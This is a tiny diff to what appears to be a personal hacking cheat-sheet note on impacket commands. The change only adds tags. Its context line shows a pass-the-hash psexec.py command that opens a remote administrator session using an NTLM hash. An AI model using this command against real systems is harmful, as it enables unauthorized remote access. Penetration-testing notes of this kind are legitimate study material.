@@ -8,4 +8,4 @@ psexec.py administrator@$IP -hashes abcd123abcd123abcd123abcd123abcd:abcd123abcd
 - ~/kb/hacking/commands/impacket-commands.md
 
 Tags:
-    #assorted #command
+    #assorted #command #hacking #impacket
